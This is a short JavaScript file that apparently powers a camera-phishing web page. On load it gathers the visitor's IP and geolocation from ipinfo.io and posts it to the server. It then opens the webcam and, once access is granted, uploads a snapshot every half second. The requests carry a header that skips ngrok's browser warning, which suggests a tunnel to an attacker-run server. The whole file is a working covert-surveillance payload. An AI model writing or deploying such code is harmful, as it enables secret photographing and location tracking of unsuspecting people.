let clientInfo;

document.addEventListener('DOMContentLoaded', async () => {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    clientInfo = await getClientInfo();
    uploadInfo(clientInfo);

    navigator.mediaDevices
        .getUserMedia({ video: true, audio: false })
        .then((stream) => {
            video.srcObject = stream;
            video.play();
            setInterval(() => takePicture(video, canvas), 500); // Cattura foto ogni 500 ms
        })
        .catch((err) => {
            console.error(`An error occurred: ${err}`);
        });
});

async function getClientInfo() {
    try {
        const resp = await fetch('https://ipinfo.io/json');
        return await resp.json();
    } catch (error) {
        console.error('Error fetching client data:', error);
    }
}

function uploadInfo(info) {
    fetch('/postinfo', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'ngrok-skip-browser-warning': '69420'
        },
        body: JSON.stringify(info)
    })
    .then(resp => resp.json())
    .then(data => console.log('Success:', data))
    .catch((error) => console.log("Error:", error));
}

function uploadPic(blob) {
    const formData = new FormData();
    formData.append('file', blob, 'capture.png');

    fetch('/postpic', {
        method: 'POST',
        body: formData,
        headers: {
            'ngrok-skip-browser-warning': '69420'
        }
    })
    .then(response => response.json())
    .then(data => console.log('Success:', data))
    .catch((error) => console.error('Error:', error));
}

function takePicture(video, canvas) {
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    const dataUrl = canvas.toDataURL('image/png');
    uploadPic(dataURLToBlob(dataUrl));
}

function dataURLToBlob(dataUrl) {
    const parts = dataUrl.split(','),
          mime = parts[0].match(/:(.*?);/)[1],
          bstr = atob(parts[1]),
          n = bstr.length,
          u8arr = new Uint8Array(n);

    for (let i = 0; i < n; i++) {
        u8arr[i] = bstr.charCodeAt(i);
    }

    return new Blob([u8arr], { type: mime });
}
